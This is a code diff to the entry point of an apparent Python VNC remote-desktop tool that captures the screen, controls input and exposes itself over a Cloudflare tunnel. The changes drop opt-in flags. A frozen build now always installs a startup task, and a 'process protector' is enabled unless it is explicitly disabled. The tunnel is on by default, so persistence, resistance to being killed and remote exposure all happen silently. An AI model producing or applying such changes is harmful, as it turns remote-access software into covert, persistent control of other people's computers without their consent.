@@ -18,21 +18,6 @@ from .config import _load_dotenv
 from .logging_utils import _setup_logging_to_file
 from .network import get_local_ip
 
-TRUE_VALUES = {"1", "true", "yes", "on"}
-FALSE_VALUES = {"0", "false", "no", "off"}
-
-
-def _env_flag(name: str, default: bool = False) -> bool:
-    value = os.environ.get(name)
-    if value is None or not str(value).strip():
-        return default
-    normalized = str(value).strip().lower()
-    if normalized in TRUE_VALUES:
-        return True
-    if normalized in FALSE_VALUES:
-        return False
-    return default
-
 
 def configure_event_loop_policy():
     try:
@@ -73,9 +58,6 @@ def configure_logging():
         logging.getLogger("asyncio").setLevel(logging.WARNING)
         logging.getLogger("websockets.server").setLevel(logging.WARNING)
         logging.getLogger("websockets").setLevel(logging.WARNING)
-        logging.getLogger("dxcam").setLevel(logging.WARNING)
-        logging.getLogger("dxcam.core.dxgi_duplicator").setLevel(logging.WARNING)
-        logging.getLogger("bettercam").setLevel(logging.WARNING)
         try:
             logging.getLogger("comtypes").setLevel(logging.WARNING)
             logging.getLogger("comtypes.client").setLevel(logging.WARNING)
@@ -195,14 +177,19 @@ def main():
     configure_logging()
     _load_dotenv()
 
-    if getattr(sys, "frozen", False) and _env_flag("ZADOO_INSTALL_STARTUP_TASK", False):
+    if getattr(sys, "frozen", False):
         install_startup_task()
 
-    use_process_protector = _env_flag("ZADOO_ENABLE_PROCESS_PROTECTOR", False)
+    use_process_protector = os.environ.get("ZADOO_DISABLE_PROCESS_PROTECTOR", "").strip().lower() not in {
+        "1",
+        "true",
+        "yes",
+        "on",
+    }
     protector = ProcessProtector() if use_process_protector else None
     _ = protector
 
-    from .dependencies import HAS_BETTERCAM, HAS_DXCAM, HAS_IMAGECODECS, HAS_PIL, HAS_PYAUTOGUI
+    from .dependencies import HAS_MSS, HAS_PIL, HAS_PYAUTOGUI, WIN32_AVAILABLE
     from .screen_capture import ScreenCapturer
     from .server import VNCServer
     from .tunnel import CloudflareTunnelManager
@@ -211,7 +198,7 @@ def main():
     print("COMPLETE VNC WITH TUNNEL")
     print("=" * 60)
 
-    if not (HAS_PYAUTOGUI and (HAS_DXCAM or HAS_BETTERCAM) and (HAS_IMAGECODECS or HAS_PIL)):
+    if not (HAS_PYAUTOGUI and (HAS_MSS or WIN32_AVAILABLE or HAS_PIL)):
         print("Missing critical dependencies for screen capture or input control")
         sys.exit(1)
 
@@ -224,7 +211,7 @@ def main():
     if secondary_port:
         print(f"Selected secondary web server port: {secondary_port}")
 
-    use_tunnel = not _env_flag("ZADOO_DISABLE_TUNNEL", False)
+    use_tunnel = os.environ.get("ZADOO_DISABLE_TUNNEL", "").strip().lower() not in {"1", "true", "yes", "on"}
     tunnel_manager = None
     if use_tunnel:
         print(f"Selected tunnel port (single): {desired_web_port}")
@@ -273,10 +260,6 @@ def main():
     except (KeyboardInterrupt, SystemExit):
         print("\nShutting down...")
     finally:
-        try:
-            vnc_server.stop()
-        except Exception:
-            pass
         capturer.stop()
         if vnc_server.tunnel_manager:
             vnc_server.tunnel_manager.cleanup()
